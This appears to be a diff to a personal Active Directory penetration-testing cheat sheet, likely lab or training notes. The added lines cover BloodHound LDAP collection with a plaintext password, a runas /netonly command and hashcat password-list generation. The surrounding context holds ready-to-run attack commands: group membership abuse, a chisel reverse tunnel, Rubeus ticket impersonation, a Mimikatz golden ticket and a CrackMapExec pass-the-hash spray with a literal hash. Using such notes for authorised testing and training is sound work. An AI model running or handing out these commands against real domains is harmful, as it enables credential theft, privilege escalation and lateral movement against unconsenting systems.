@@ -103,6 +103,10 @@ Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'willy' -Credential $Cred 
 get-domainuser willy
 Get-DomainGroupMember -Identity 'MAILADMINS'
 ```
+bloodhound with ldap (non-domain-joined) (make sure dns can find domain fqdn)
+```
+invoke-bloodhound -collectionmethod all -domain "final.com" -LDAPUser "jack" -LDAPPass "P@ssw0rd"
+```
 chisel socks (win)
 ```
 /opt/chisel/chisel server -p 8000 --reverse
@@ -165,6 +169,10 @@ c:\windows\tasks\or.exe asktgt /user:web01$ /domain:evil.com /rc4:004686491797c2
 ```
 c:\windows\tasks\or.exe s4u /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt /ticket:<tix>
 ```
+cmd run powershell as another user (provide password in prompt)
+```
+runas /netonly /user:final.com\jack powershell
+```
 cme spray hash (local auth)
 ```
 proxychains -q -f web05.conf crackmapexec smb ips.txt -u administrator -H 8388d07604009d14cbb78f7d37b9e887 --local-auth
@@ -224,6 +232,10 @@ c:\windows\tasks\m.exe "privilege::debug"
 ```
 ```
 kerberos::golden /user:fakeuser /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
+```
+hashcat generate password list
+```
+hashcat --force list.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles5.rule -r /usr/share/hashcat/rules/append_atsign.rule -r /usr/share/hashcat/rules/append_exclamation.rule --stdout | sort -u > list-uniq.txt
 ```
 impacket-psexec - kerberos
 ```
